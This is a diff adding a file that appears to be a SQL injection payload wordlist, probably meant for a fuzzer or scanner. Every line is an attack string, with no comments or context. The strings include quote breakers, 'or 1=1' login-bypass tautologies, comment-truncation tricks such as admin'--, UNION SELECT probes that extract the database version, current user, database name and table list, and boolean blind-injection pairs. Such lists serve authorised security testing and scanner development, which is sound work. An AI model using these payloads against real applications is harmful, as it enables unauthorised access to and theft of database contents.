@@ -1,0 +1,41 @@
+'
+''
+`
+``
+"
+""
+'
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'#
+' or '1'='1'/*
+' or 1=1 limit 1--
+' or 1=1 limit 0,1--
+admin'--
+admin'#
+admin'/*
+'or'1'='1
+'or'1'='1'--
+'or'1'='1'#
+'or'1'='1'/*
+1' or '1'='1
+1' or 1=1--
+1' or 1=1#
+1' or 1=1/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT table_name FROM information_schema.tables--
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
